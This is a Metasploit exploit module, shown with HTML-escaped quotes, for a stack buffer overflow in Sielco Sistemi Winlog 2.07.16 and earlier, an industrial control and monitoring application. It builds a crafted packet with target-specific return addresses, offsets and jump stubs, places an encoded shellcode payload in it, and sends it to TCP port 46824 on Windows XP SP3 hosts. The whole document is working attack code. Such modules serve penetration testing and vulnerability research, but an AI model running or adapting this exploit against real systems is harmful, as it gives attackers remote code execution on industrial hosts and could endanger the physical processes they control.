 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sielco Sistemi Winlog <= 2.07.16&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow
                found in Sielco Sistemi Winlog <= 2.07.16. The
                overflow is triggered during the parsing of a
                maliciously crafted packet
            },
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 150,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;DisableNops&#039; => &#039;True&#039;,
                    # add esp, -5500
                    &#039;PrependEncoder&#039; => "\x81\xc4\x84\xea\xff\xff",
                    &#039;Compat&#039;    =>
                        {
                            &#039;SymbolLookup&#039; => &#039;ws2ord&#039;,
                        }
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3 EN (Automatic Washing System Demo)&#039;,
                            {
                                # vcldb40.bpl
                                # jmp esp
                                &#039;Ret&#039; => 0x46035f8b,
                                &#039;Offset&#039; => 160,
                                &#039;jmp&#039; => "\xe9\x56\xff\xff\xff",
                            }
                    ],
                    [
                        &#039;Windows XP SP3 EN (Car Simulation)&#039;,
                            {
                                # vcl40.bpl
                                # jmp esp
                                &#039;Ret&#039; => 0x4003eb6b,
                                &#039;Offset&#039; => 175,
                                &#039;jmp&#039; => "\xe9\x46\xff\xff\xff",
                            }
                    ],
                    [ 
                        &#039;Windows XP SP3 EN (Ceramics Kiln)&#039;, 
                            { 
                                # ter19.dll
                                # push esp/ retn
                                &#039;Ret&#039; => 0x258b4432,
                                &#039;Offset&#039; => 176,
                                &#039;jmp&#039; => "\xe9\x46\xff\xff\xff",
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 26 2012&#039;))
 
        register_options([Opt::RPORT(46824)], self.class)
    end
 
    def exploit
        connect
 
        boom =  rand_text_alpha_upper(20)
        boom << &#039;x&#039;
        boom << rand_text_alpha_upper(target[&#039;Offset&#039;])
        boom << [target.ret].pack(&#039;V&#039;)
        boom << "\x41" * 4
        boom << target[&#039;jmp&#039;]
        boom << "\xcc" * (281 - boom.length)
 
        boom[22,4] = "\x41" * 4
        boom[26,payload.encoded.length] = payload.encoded
 
        print_status("Trying target #{target.name}...")
        sock.put(boom)
 
        handler
    end
 
end

